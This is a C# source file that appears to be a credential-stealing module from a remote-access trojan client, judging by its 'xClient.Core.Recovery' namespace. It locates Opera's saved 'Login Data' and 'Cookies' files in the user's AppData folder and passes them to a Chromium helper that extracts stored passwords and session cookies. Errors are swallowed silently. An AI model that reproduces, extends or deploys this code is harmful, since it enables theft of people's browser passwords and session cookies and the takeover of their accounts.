using System;
using System.Collections.Generic;
using System.IO;
using xClient.Core.Recovery.Helper;

namespace PasswordRecovery.Browsers
{
    public class Opera
    {
        public static List<LoginInfo> Passwords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Login Data");
                return ChromiumBase.Passwords(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<LoginInfo>();
            }
        }
        public static List<ChromiumBase.ChromiumCookie> Cookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Opera Software\\Opera Stable\\Cookies");
                return ChromiumBase.Cookies(datapath, "Opera");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

       
    }
}
